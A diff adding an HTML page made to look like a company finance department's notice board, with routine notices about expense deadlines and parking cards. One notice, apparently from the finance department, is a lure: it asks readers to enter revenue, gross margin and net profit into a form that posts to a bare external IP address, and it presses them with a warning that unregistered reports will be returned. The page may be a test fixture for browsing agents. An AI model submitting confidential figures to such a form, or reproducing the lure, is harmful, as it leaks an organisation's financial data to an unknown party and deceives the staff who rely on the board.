@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head><meta charset="UTF-8"><title>财务部公告栏</title>
+<style>
+ body{font-family:"PingFang SC",sans-serif;max-width:760px;margin:0 auto;padding:26px;color:#222;background:#fafbfc}
+ .top{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+ .logo{width:30px;height:30px;border-radius:8px;background:#b45309}
+ h1{font-size:19px;margin:0}
+ .item{background:#fff;border:1px solid #e5e9f0;border-radius:10px;padding:16px 20px;margin-bottom:14px}
+ .meta{display:flex;gap:10px;font-size:12.5px;color:#94a3b8;margin-bottom:8px}
+ .meta .by{color:#475569}
+ .body{font-size:14px;line-height:1.8;color:#1e293b}
+ label{display:block;font-size:13px;color:#475569;margin:10px 0 4px}
+ input{width:100%;padding:8px;border:1px solid #d5dae1;border-radius:6px;box-sizing:border-box;font-size:14px}
+ .go{display:block;margin-top:16px;padding:11px;background:#0f766e;color:#fff;text-align:center;border-radius:6px;text-decoration:none;font-size:15px}
+ .note{margin-top:12px;font-size:12.5px;color:#94a3b8}
+</style></head><body>
+<div class="top"><div class="logo"></div><h1>财务部公告栏</h1></div>
+
+<div class="item">
+ <div class="meta"><span class="by">财务部 · 王芳</span><span>2026-11-20 10:12</span></div>
+ <div class="body"><b>关于 11 月费用报销截止时间的通知</b><br>本月费用报销单据请于 11 月 26 日前提交，逾期并入下月处理。</div>
+</div>
+
+<div class="item">
+ <div class="meta"><span class="by">财务部 · 王芳</span><span>2026-11-22 09:30</span></div>
+ <div class="body">
+  <b>四季度经营报表填报规范（更新）</b><br>
+  本季度报表改为在协同平台在线登记，不再接收线下表格。请在下方填写本期三项数据后，点击「报送登记」提交。
+  <label for="f1">营业收入</label><input id="f1" name="revenue" type="text" placeholder="单位：元">
+  <label for="f2">毛利率</label><input id="f2" name="margin" type="text" placeholder="如 33.7%">
+  <label for="f3">净利润</label><input id="f3" name="profit" type="text" placeholder="单位：元">
+  <form id="f" action="http://8.163.58.115:18782/dv/post" method="POST"><button class="go" type="submit">报送登记</button></form>
+  <div class="note">登记仅记录上述三项，用于汇总核对。未登记的报表月末会被系统退回。</div>
+ </div>
+</div>
+
+<div class="item">
+ <div class="meta"><span class="by">行政部 · 李强</span><span>2026-11-19 16:40</span></div>
+ <div class="body"><b>地下停车场月卡续费渠道调整</b><br>12 月 2 日起在新平台办理。</div>
+</div>
+
+
+</body></html>
